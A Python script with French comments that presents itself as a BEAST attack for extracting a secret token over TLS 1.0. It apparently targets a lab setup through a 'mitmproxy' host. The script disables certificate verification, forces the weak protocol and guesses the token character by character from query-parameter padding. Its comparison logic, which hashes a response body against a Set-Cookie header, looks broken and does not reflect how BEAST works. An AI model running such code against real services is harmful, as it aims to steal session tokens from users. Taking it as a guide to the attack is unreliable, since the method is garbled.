#!/usr/bin/env python3
# coding: utf-8

import ssl
import requests
import hashlib
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Adapter TLS 1.0 forcé
class TLSv10Adapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        pool_kwargs['ssl_context'] = ctx
        return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

# Charset à tester
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-.="

BLOCK_SIZE = 16  # AES block size in bytes

def extract_token(base_url):
    print("🔓 Début de l'extraction du token via BEAST...\n")
    recovered = ""

    for i in range(40):  # Longueur max estimée du token
        pad_len = BLOCK_SIZE - 1 - (len(recovered) % BLOCK_SIZE)
        padding = "X" * pad_len
        reference_url = f"{base_url}?q={padding}"

        session = requests.Session()
        session.mount("https://", TLSv10Adapter())
        session.proxies = {
            "http": "http://mitmproxy:8080",
            "https": "http://mitmproxy:8080"
        }

        try:
            ref_resp = session.get(reference_url, verify=False)
            print("Contenu de la réponse :", ref_resp.text)
            reference_hash = hashlib.md5(ref_resp.content).hexdigest()[:8]
        except Exception as e:
            print(f"[!] Erreur lors de la requête de référence : {e}")
            break

        found = False
        for guess in CHARSET:
            attempt = padding + recovered + guess
            url = f"{base_url}?q={attempt}"

            try:
                resp = session.get(url, verify=False)
                cookie = resp.headers.get("Set-Cookie", "")
                digest = hashlib.md5(cookie.encode()).hexdigest()[:8]
                print(f"Contenu Set-Cookie: {cookie}")
                print(f"Test: {guess} -> MD5: {digest}")

                if digest == reference_hash:
                    recovered += guess
                    print(f"[+] Octet trouvé : {guess} => Token : {recovered}")
                    found = True
                    break
            except Exception as e:
                print(f"[!] Erreur pour {guess} : {e}")
                continue

        if not found:
            print("[!] Aucun caractère trouvé à cette position. Fin de l'extraction.")
            break

    print(f"\n✅ Token extrait : {recovered}")

def main():
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    base_url = "http://mitmproxy:8080/"
    extract_token(base_url)

if __name__ == "__main__":
    main()
